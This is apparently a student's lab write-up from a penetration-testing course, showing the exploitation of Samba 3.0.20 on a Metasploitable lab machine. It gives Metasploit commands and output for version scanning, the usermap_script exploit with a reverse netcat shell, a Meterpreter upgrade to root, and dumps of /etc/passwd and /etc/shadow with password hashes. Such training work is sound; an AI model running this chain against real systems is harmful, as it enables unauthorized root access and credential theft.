---
layout: post
title: "Targeting SAMBA"
date: "2023-05-16"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Linux Black Box Penetration Test（Linux 黑盒渗透测试）
## Targeting SAMBA（针对 SAMBA）
# Demo: Targeting SAMBA（演示：针对 SAMBA）
We're going to be taking a look at how to exploit Samba running on the Linux target. What Samba is? It's the open source implementation of SMB for Linux, and it works exactly very similar to how SMB works on Windows. In terms of exploiting Samba, is the process of identifying vulnerability within the specific version of Samba that's running on the target and how to exploit it in order to obtain access to the target system via a reverse shell or even a Meterpreter session. We can get started with taking a look at the techniques that will allow us to exploit Samba and consequently gain access to the target system.

`-sV`: perform a service version scan.

`-p 445`: on port 445, which is appropriate for Samba.

```
nmap -sV -p 445 10.2.17.132
```

Perform banner grabbing on the target on port 445.

```
nc -nv 10.2.17.132 445
```

How can we enumerate the exact version of Sammba that's running on the target? We can do this through the use of Metasploit Framework module called SMB version. That is not just applicable to Samba, but also to SMB on Windows. This can work both ways. I recommend that you run it whenever you're trying to target SMB on a Windows system as well.

```
msfconsole -q
search smb_version
use 0
show options
set RHOSTS 10.2.17.132
run
```

This should tell us the exact version of Samba running on the target. The target system is running Samba 3.0.20.

```
searchsploit samba 3.0.20
```

```
search samba 3.0.20
use 0
show info
set RHOSTS 10.2.17.132
exploit 
```

We can utilize the reverse shell that we will be provided with. Alternatively, we can also upgrade that into a Meterpreter session. We should be able to obtain a reverse shell.

```
ls -al
cat /etc/*issue
cat /etc/*release
```

Put this in the background.

List out our sessions.

```
sessions
```

In order to upgrade a session to a Meterpreter session:

```
sessions -u 1
```

We receive a Meterpreter session.

```
sessions
```

On session id 2, we have a Meterpreter. And not only that, we also have obtained root access on the target system. 

```
sessions 2
```

```
sysinfo
getuid
```

We have root access on the target system, which means we don't need to elevate our privileges.

And apart from the bind shell listener that we were able to gain access to, this is the only exploit that has given us root access right out of the box. And I wanted to highlight it for that reason, primarily because you can skip over the privilege escalation section if you are able to exploit the target via this exploit module.

List out the users on the system.

```
cat /etc/passwd
```

Dump hashes
  
```
cat /etc/shadow
```

Crack Linux MD5 hashes.

# Targeting SAMBA（针对SAMBA）
## Overview（概述）
Goal

This lab covers the process of exploiting a vulnerable version of SAMBA running on a Linux target.

目标

本实验涵盖了利用在 Linux 目标上运行的易受攻击版本的 SAMBA 的过程。

## Tasks（任务）
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

## 复现视频内容

10.0.27.245    demo.ine.local

10.10.21.2      Kali Linux

```
root@attackdefense:~# nmap -sV -p 445 10.0.27.245
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-16 13:21 IST
Nmap scan report for demo.ine.local (10.0.27.245)
Host is up (0.0031s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

```
root@attackdefense:~# nc -nv 10.0.27.245 445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.27.245:445.

```

```
root@attackdefense:~# msfconsole -q
msf6 > setg RHOSTS 10.0.27.245
RHOSTS => 10.0.27.245
msf6 > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.0.27.245      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.0.27.245:445       - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.0.27.245:445       -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.0.27.245:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
root@attackdefense:~# searchsploit Samba 3.0.20
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                          | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                     | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                             | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

[Samba "username map script" Command Execution](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

Samba“用户名映射脚本”命令执行

当使用非默认的“用户名映射脚本”配置选项时，此模块利用 Samba 版本 3.0.20 到 3.0.25rc3 中的命令执行漏洞。通过指定包含 shell 元字符的用户名，攻击者可以执行任意命令。利用此漏洞不需要身份验证，因为此选项用于在身份验证之前映射用户名！

```
msf6 auxiliary(scanner/smb/smb_version) > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 auxiliary(scanner/smb/smb_version) > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.27.245      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.21.2       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.21.2:4444 
[*] Command shell session 1 opened (10.10.21.2:4444 -> 10.0.27.245:46630 ) at 2023-05-16 13:33:17 +0530

pwd
/
ls 
bin
boot
cdrom
core
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
cat /etc/*issue
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
id
uid=0(root) gid=0(root)
^Z
Background session 1? [y/N]  y
```

```
msf6 exploit(multi/samba/usermap_script) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.10.21.2:4444 -> 10.0.27.245:46630  (10.0.27.245)

msf6 exploit(multi/samba/usermap_script) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.21.2:4433 
[*] Sending stage (984904 bytes) to 10.0.27.245
[*] Meterpreter session 2 opened (10.10.21.2:4433 -> 10.0.27.245:56004 ) at 2023-05-16 13:37:27 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/samba/usermap_script) > sessions

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         shell cmd/unix                            10.10.21.2:4444 -> 10.0.27.245:46630  (10.0.27.245)
  2         meterpreter x86/linux  root @ 172.17.0.2  10.10.21.2:4433 -> 10.0.27.245:56004  (172.17.0.2)
```

```
msf6 exploit(multi/samba/usermap_script) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 8.04 (Linux 5.4.0-1048-aws)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: root
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
```

```
meterpreter > cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
```